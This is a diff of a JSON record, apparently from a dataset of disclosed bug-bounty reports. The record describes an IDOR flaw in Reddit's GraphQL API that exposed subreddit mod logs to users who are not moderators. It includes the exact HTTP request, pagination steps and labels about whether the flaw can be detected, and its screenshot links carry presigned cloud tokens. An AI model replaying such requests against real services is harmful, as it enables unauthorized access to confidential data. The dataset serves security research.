@@ -1,55 +1,55 @@
 {
-    "reported_to": "Reddit",
-    "reported_by": "high_ping_ninja ",
-    "title": "Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability",
-    "content": "\nSummary:\nThere's no check if the user is moderator of the particular subreddit or not while trying to access the mod logs via gql.reddit.com by using operation id. You can change the parameter subredditName to any target subreddit name which is public or restricted and get access to mod logs of that subreddit.\nSteps To Reproduce:\nLog into any account as an attacker and get the authorization token\nSend request given below at gql.reddit.com\nCode 510 Bytes\n1POST / HTTP/2\n2Host: gql.reddit.com\n3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/json\n8Content-Length: 62\n9X-Reddit-Compression: 1\n10Origin: https://www.reddit.com\n11Sec-Fetch-Dest: empty\n12Sec-Fetch-Mode: cors\n13Sec-Fetch-Site: same-site\n14Authorization: Bearer ourtoken\n15Referer: https://www.reddit.com/\n16Te: trailers\n17\n18{\"id\":\"6243efcbc61d\",\"variables\":{\"subredditName\":\"any-subreddit\"}}\n<image_0>\nIt only gives one page of logs.Look at the response and see if the value of hasNextPage is true or false. If It's false then there are no more logs other than the ones we got\n<image_1>\nFinal request body will look something like this\nCode 99 Bytes\n1{\"id\":\"6243efcbc61d\",\"variables\":{\"subredditName\":\"any-subreddit\",\n2\"after\":\"code-from-endCursor\"\n3}}\nAfter sending the request we'll get second page of logs. If we still get hasNextPage as true, Keep doing this untill we see hasNextPage set to false in the response. by doing this we can get all the pages of mod logs one by one.\nUse this script to make things easier in confirming this vulnerability (mod_logs.sh (F1851561))\nThe output will get stored in mod_log_out.txt in the same directory\n[attachment / reference]\nresponsebody1.png (F1851522)\nendCursorCode.png (F1851533)\nmod_logs.sh (F1851561)\nImpact\nConfidential information getting exposed.\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "Reddit",
+  "reported_by": "high_ping_ninja ",
+  "title": "Getting access of mod logs from any public or restricted subreddit with IDOR vulnerability",
+  "content": "\nSummary:\nThere's no check if the user is moderator of the particular subreddit or not while trying to access the mod logs via gql.reddit.com by using operation id. You can change the parameter subredditName to any target subreddit name which is public or restricted and get access to mod logs of that subreddit.\nSteps To Reproduce:\nLog into any account as an attacker and get the authorization token\nSend request given below at gql.reddit.com\nCode 510 Bytes\n1POST / HTTP/2\n2Host: gql.reddit.com\n3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/json\n8Content-Length: 62\n9X-Reddit-Compression: 1\n10Origin: https://www.reddit.com\n11Sec-Fetch-Dest: empty\n12Sec-Fetch-Mode: cors\n13Sec-Fetch-Site: same-site\n14Authorization: Bearer ourtoken\n15Referer: https://www.reddit.com/\n16Te: trailers\n17\n18{\"id\":\"6243efcbc61d\",\"variables\":{\"subredditName\":\"any-subreddit\"}}\n<image_0>\nIt only gives one page of logs.Look at the response and see if the value of hasNextPage is true or false. If It's false then there are no more logs other than the ones we got\n<image_1>\nFinal request body will look something like this\nCode 99 Bytes\n1{\"id\":\"6243efcbc61d\",\"variables\":{\"subredditName\":\"any-subreddit\",\n2\"after\":\"code-from-endCursor\"\n3}}\nAfter sending the request we'll get second page of logs. If we still get hasNextPage as true, Keep doing this untill we see hasNextPage set to false in the response. by doing this we can get all the pages of mod logs one by one.\nUse this script to make things easier in confirming this vulnerability (mod_logs.sh (F1851561))\nThe output will get stored in mod_log_out.txt in the same directory\n[attachment / reference]\nresponsebody1.png (F1851522)\nendCursorCode.png (F1851533)\nmod_logs.sh (F1851561)\nImpact\nConfidential information getting exposed.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 5000,
+  "weaknesses": [
+    "Insecure Direct Object Reference (IDOR)"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9qzg80jk5k09y8xtov6y2bmp2aln?response-content-disposition=attachment%3B%20filename%3D%22responsebody1.png%22%3B%20filename%2A%3DUTF-8%27%27responsebody1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQIQ5KUSS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021438Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCKuyyZXlQ2njmS%2Fa4nZzQdBtH9R9kUD4AxuYC2K4Gp7QIgdqD92L0oic9EKvtkSEeUvkGKRp6XW6UnufgL79gdwmwqugUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGOqcH%2BOUJTUMR%2BKGCqOBaC24NIhANHTCigo0pQ4490ABOtX0b6jObZCsrutfhm4jiLwGkJ1cYvPiVzLwQIAFN4iV3rioi8TOduvSyxcHHzrKpsl%2FBJmkwkumEmGmUwqQag6j0LmOBONZCE%2F5Zgj1pHKTIDF%2FS3Lo7K7c3r86hmP%2BRy4bH0LY1G%2FlnYASHvT%2BVtKpzBzJ9yHorzjDdYoTHfUSVlb6FjxAziAyU2b1%2BPWjlDYojIgsQ1xbcHnzKP%2BL8FHILUKRzZUxp4EzCBr8JhoMjY9zq5QL7YjH24YUKWxXUeg5i%2BcMk5KGSzhUb973XtodC%2Btd%2B58VX8yaAs1WpIIORGoPvW2iGj6KHI4fGr6Ub7B2aiHnYr7NjmASNH3zqbQ8wCyZ8C5ACNsvAzsX%2BSMEYAjrUOtRn2jNIftjnSjr%2BIaL9AFbtbYeLozumnSdvF7c%2FojGGbaNZ%2FsPVH2Tpbt9QRPUJvbdd%2FntuhOO7w11FoMNWYYUTHvN72GgQamH9bYdtWco3xcOqxbollpS2ufDndvjhwVCjtdmqjUXUl5brSlK%2F0yQ1f3rmATzKJqmCGZY%2BQW1VF3TvED%2Fjp5dzRj%2F0HDtrQpTAPWWfNtoFJswSCj%2F8QqSSugbOLy0EOEFVMJzD5%2F984e6xXJZWI%2F7xooprLK8Ffe3%2F1uT01aBHkes9ynlHyKntetCNiKNr19nm7SuhL60aCyqqU4CYBgsGjbGunbdsTXkqjWXRvpY1Rvi9vPw6IRl7%2F5Exi96MYpigrcglxYjCvZjPfJLG1TjL6eoa7ihGDhhw7AGUbDLPFI3Kg79LluB6U87o1KPz%2FM%2FcxZ9QJ38R2J5mWugVH9ebcm%2BA%2FunMzpqMjYj1kwATdXNK56VepNd16cCT2f4DChiYi%2FBjqxAai2z3T0fjnEIkGuCaTREA6lecV91L5wnaJRIHlz55q5V4e4plxP4WfGv00uDz5TxFMBKvFxeGYOQpznspPkopF0CPKLyzA%2Bdfe%2FRMarP4kpJapbXCHGtzeAZmhGGscDCOQvjdE4cCSIKQOgozync6Z8EzuEDqB1lckpZb7DWTD1XMM0xAI5F%2BffCgGNLYlC1s37aOxpNwgqNdbVhnV37RpgyWm1Zg2iH6ZtTZ8kr34uZA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aaa7935a240115872cc5af2469407074b617a644bfa23eae4a76989c8a4bc454",
+    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3oageoebxxhzxs6u9148566ma8au?response-content-disposition=attachment%3B%20filename%3D%22endCursorCode.png%22%3B%20filename%2A%3DUTF-8%27%27endCursorCode.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQIQ5KUSS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021438Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCKuyyZXlQ2njmS%2Fa4nZzQdBtH9R9kUD4AxuYC2K4Gp7QIgdqD92L0oic9EKvtkSEeUvkGKRp6XW6UnufgL79gdwmwqugUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGOqcH%2BOUJTUMR%2BKGCqOBaC24NIhANHTCigo0pQ4490ABOtX0b6jObZCsrutfhm4jiLwGkJ1cYvPiVzLwQIAFN4iV3rioi8TOduvSyxcHHzrKpsl%2FBJmkwkumEmGmUwqQag6j0LmOBONZCE%2F5Zgj1pHKTIDF%2FS3Lo7K7c3r86hmP%2BRy4bH0LY1G%2FlnYASHvT%2BVtKpzBzJ9yHorzjDdYoTHfUSVlb6FjxAziAyU2b1%2BPWjlDYojIgsQ1xbcHnzKP%2BL8FHILUKRzZUxp4EzCBr8JhoMjY9zq5QL7YjH24YUKWxXUeg5i%2BcMk5KGSzhUb973XtodC%2Btd%2B58VX8yaAs1WpIIORGoPvW2iGj6KHI4fGr6Ub7B2aiHnYr7NjmASNH3zqbQ8wCyZ8C5ACNsvAzsX%2BSMEYAjrUOtRn2jNIftjnSjr%2BIaL9AFbtbYeLozumnSdvF7c%2FojGGbaNZ%2FsPVH2Tpbt9QRPUJvbdd%2FntuhOO7w11FoMNWYYUTHvN72GgQamH9bYdtWco3xcOqxbollpS2ufDndvjhwVCjtdmqjUXUl5brSlK%2F0yQ1f3rmATzKJqmCGZY%2BQW1VF3TvED%2Fjp5dzRj%2F0HDtrQpTAPWWfNtoFJswSCj%2F8QqSSugbOLy0EOEFVMJzD5%2F984e6xXJZWI%2F7xooprLK8Ffe3%2F1uT01aBHkes9ynlHyKntetCNiKNr19nm7SuhL60aCyqqU4CYBgsGjbGunbdsTXkqjWXRvpY1Rvi9vPw6IRl7%2F5Exi96MYpigrcglxYjCvZjPfJLG1TjL6eoa7ihGDhhw7AGUbDLPFI3Kg79LluB6U87o1KPz%2FM%2FcxZ9QJ38R2J5mWugVH9ebcm%2BA%2FunMzpqMjYj1kwATdXNK56VepNd16cCT2f4DChiYi%2FBjqxAai2z3T0fjnEIkGuCaTREA6lecV91L5wnaJRIHlz55q5V4e4plxP4WfGv00uDz5TxFMBKvFxeGYOQpznspPkopF0CPKLyzA%2Bdfe%2FRMarP4kpJapbXCHGtzeAZmhGGscDCOQvjdE4cCSIKQOgozync6Z8EzuEDqB1lckpZb7DWTD1XMM0xAI5F%2BffCgGNLYlC1s37aOxpNwgqNdbVhnV37RpgyWm1Zg2iH6ZtTZ8kr34uZA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3b7024228e57b07dd46fc3d5bbd3a2f20049c50409dcd8a155f235e699019724"
+  },
+  "disclosed_date": 1659656280,
+  "report_url": "https://hackerone.com/reports/1658418",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Log into any account as an attacker and obtain the authorization token."
     ],
-    "bounty": 5000,
-    "weaknesses": [
-        "Insecure Direct Object Reference (IDOR)"
+    [
+      2,
+      "Send a POST request to gql.reddit.com with the operation ID and the target subreddit name in the variables."
     ],
-    "screenshots": {
-        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9qzg80jk5k09y8xtov6y2bmp2aln?response-content-disposition=attachment%3B%20filename%3D%22responsebody1.png%22%3B%20filename%2A%3DUTF-8%27%27responsebody1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQIQ5KUSS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021438Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCKuyyZXlQ2njmS%2Fa4nZzQdBtH9R9kUD4AxuYC2K4Gp7QIgdqD92L0oic9EKvtkSEeUvkGKRp6XW6UnufgL79gdwmwqugUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGOqcH%2BOUJTUMR%2BKGCqOBaC24NIhANHTCigo0pQ4490ABOtX0b6jObZCsrutfhm4jiLwGkJ1cYvPiVzLwQIAFN4iV3rioi8TOduvSyxcHHzrKpsl%2FBJmkwkumEmGmUwqQag6j0LmOBONZCE%2F5Zgj1pHKTIDF%2FS3Lo7K7c3r86hmP%2BRy4bH0LY1G%2FlnYASHvT%2BVtKpzBzJ9yHorzjDdYoTHfUSVlb6FjxAziAyU2b1%2BPWjlDYojIgsQ1xbcHnzKP%2BL8FHILUKRzZUxp4EzCBr8JhoMjY9zq5QL7YjH24YUKWxXUeg5i%2BcMk5KGSzhUb973XtodC%2Btd%2B58VX8yaAs1WpIIORGoPvW2iGj6KHI4fGr6Ub7B2aiHnYr7NjmASNH3zqbQ8wCyZ8C5ACNsvAzsX%2BSMEYAjrUOtRn2jNIftjnSjr%2BIaL9AFbtbYeLozumnSdvF7c%2FojGGbaNZ%2FsPVH2Tpbt9QRPUJvbdd%2FntuhOO7w11FoMNWYYUTHvN72GgQamH9bYdtWco3xcOqxbollpS2ufDndvjhwVCjtdmqjUXUl5brSlK%2F0yQ1f3rmATzKJqmCGZY%2BQW1VF3TvED%2Fjp5dzRj%2F0HDtrQpTAPWWfNtoFJswSCj%2F8QqSSugbOLy0EOEFVMJzD5%2F984e6xXJZWI%2F7xooprLK8Ffe3%2F1uT01aBHkes9ynlHyKntetCNiKNr19nm7SuhL60aCyqqU4CYBgsGjbGunbdsTXkqjWXRvpY1Rvi9vPw6IRl7%2F5Exi96MYpigrcglxYjCvZjPfJLG1TjL6eoa7ihGDhhw7AGUbDLPFI3Kg79LluB6U87o1KPz%2FM%2FcxZ9QJ38R2J5mWugVH9ebcm%2BA%2FunMzpqMjYj1kwATdXNK56VepNd16cCT2f4DChiYi%2FBjqxAai2z3T0fjnEIkGuCaTREA6lecV91L5wnaJRIHlz55q5V4e4plxP4WfGv00uDz5TxFMBKvFxeGYOQpznspPkopF0CPKLyzA%2Bdfe%2FRMarP4kpJapbXCHGtzeAZmhGGscDCOQvjdE4cCSIKQOgozync6Z8EzuEDqB1lckpZb7DWTD1XMM0xAI5F%2BffCgGNLYlC1s37aOxpNwgqNdbVhnV37RpgyWm1Zg2iH6ZtTZ8kr34uZA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aaa7935a240115872cc5af2469407074b617a644bfa23eae4a76989c8a4bc454",
-        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3oageoebxxhzxs6u9148566ma8au?response-content-disposition=attachment%3B%20filename%3D%22endCursorCode.png%22%3B%20filename%2A%3DUTF-8%27%27endCursorCode.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQIQ5KUSS%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021438Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCKuyyZXlQ2njmS%2Fa4nZzQdBtH9R9kUD4AxuYC2K4Gp7QIgdqD92L0oic9EKvtkSEeUvkGKRp6XW6UnufgL79gdwmwqugUI%2Bv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGOqcH%2BOUJTUMR%2BKGCqOBaC24NIhANHTCigo0pQ4490ABOtX0b6jObZCsrutfhm4jiLwGkJ1cYvPiVzLwQIAFN4iV3rioi8TOduvSyxcHHzrKpsl%2FBJmkwkumEmGmUwqQag6j0LmOBONZCE%2F5Zgj1pHKTIDF%2FS3Lo7K7c3r86hmP%2BRy4bH0LY1G%2FlnYASHvT%2BVtKpzBzJ9yHorzjDdYoTHfUSVlb6FjxAziAyU2b1%2BPWjlDYojIgsQ1xbcHnzKP%2BL8FHILUKRzZUxp4EzCBr8JhoMjY9zq5QL7YjH24YUKWxXUeg5i%2BcMk5KGSzhUb973XtodC%2Btd%2B58VX8yaAs1WpIIORGoPvW2iGj6KHI4fGr6Ub7B2aiHnYr7NjmASNH3zqbQ8wCyZ8C5ACNsvAzsX%2BSMEYAjrUOtRn2jNIftjnSjr%2BIaL9AFbtbYeLozumnSdvF7c%2FojGGbaNZ%2FsPVH2Tpbt9QRPUJvbdd%2FntuhOO7w11FoMNWYYUTHvN72GgQamH9bYdtWco3xcOqxbollpS2ufDndvjhwVCjtdmqjUXUl5brSlK%2F0yQ1f3rmATzKJqmCGZY%2BQW1VF3TvED%2Fjp5dzRj%2F0HDtrQpTAPWWfNtoFJswSCj%2F8QqSSugbOLy0EOEFVMJzD5%2F984e6xXJZWI%2F7xooprLK8Ffe3%2F1uT01aBHkes9ynlHyKntetCNiKNr19nm7SuhL60aCyqqU4CYBgsGjbGunbdsTXkqjWXRvpY1Rvi9vPw6IRl7%2F5Exi96MYpigrcglxYjCvZjPfJLG1TjL6eoa7ihGDhhw7AGUbDLPFI3Kg79LluB6U87o1KPz%2FM%2FcxZ9QJ38R2J5mWugVH9ebcm%2BA%2FunMzpqMjYj1kwATdXNK56VepNd16cCT2f4DChiYi%2FBjqxAai2z3T0fjnEIkGuCaTREA6lecV91L5wnaJRIHlz55q5V4e4plxP4WfGv00uDz5TxFMBKvFxeGYOQpznspPkopF0CPKLyzA%2Bdfe%2FRMarP4kpJapbXCHGtzeAZmhGGscDCOQvjdE4cCSIKQOgozync6Z8EzuEDqB1lckpZb7DWTD1XMM0xAI5F%2BffCgGNLYlC1s37aOxpNwgqNdbVhnV37RpgyWm1Zg2iH6ZtTZ8kr34uZA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3b7024228e57b07dd46fc3d5bbd3a2f20049c50409dcd8a155f235e699019724"
-    },
-    "disclosed_date": 1659656280,
-    "report_url": "https://hackerone.com/reports/1658418",
-    "is_multi_component": false,
-    "complexity": "LOW",
-    "novelty": "LOW",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Log into any account as an attacker and obtain the authorization token."
-        ],
-        [
-            2,
-            "Send a POST request to gql.reddit.com with the operation ID and the target subreddit name in the variables."
-        ],
-        [
-            3,
-            "Check the response for 'hasNextPage' and if true, use the 'after' parameter with the 'endCursor' code to fetch subsequent pages of logs until 'hasNextPage' is false."
-        ]
-    ],
-    "vuln_description": "The vulnerability is an Insecure Direct Object Reference (IDOR) issue where an attacker can access mod logs of any public or restricted subreddit by changing the 'subredditName' parameter in a GraphQL request to gql.reddit.com, without any verification of moderator status.",
-    "reason": "The attack involves a straightforward manipulation of a single parameter in a GraphQL request. The steps are linear and do not require complex interactions or state manipulations. The logic is not novel and is commonly seen in IDOR vulnerabilities.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": true,
-    "authnz_byppass_detectable": false,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": true,
-        "authnz_byppass_detectable": true
-    }
+    [
+      3,
+      "Check the response for 'hasNextPage' and if true, use the 'after' parameter with the 'endCursor' code to fetch subsequent pages of logs until 'hasNextPage' is false."
+    ]
+  ],
+  "vuln_description": "The vulnerability is an Insecure Direct Object Reference (IDOR) issue where an attacker can access mod logs of any public or restricted subreddit by changing the 'subredditName' parameter in a GraphQL request to gql.reddit.com, without any verification of moderator status.",
+  "reason": "The attack involves a straightforward manipulation of a single parameter in a GraphQL request. The steps are linear and do not require complex interactions or state manipulations. The logic is not novel and is commonly seen in IDOR vulnerabilities.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": false,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves accessing mod logs of a subreddit by changing the subredditName parameter without proper authorization checks. This fits the IDOR vulnerability class where (user_session, action, resource_id) tuples are manipulated. The methodology would detect this by swapping the subredditName (resource_id) with another subreddit's name and testing access with the same user session (user_session) and action (fetching mod logs).",
+    "is_detectable": true
+  }
 }
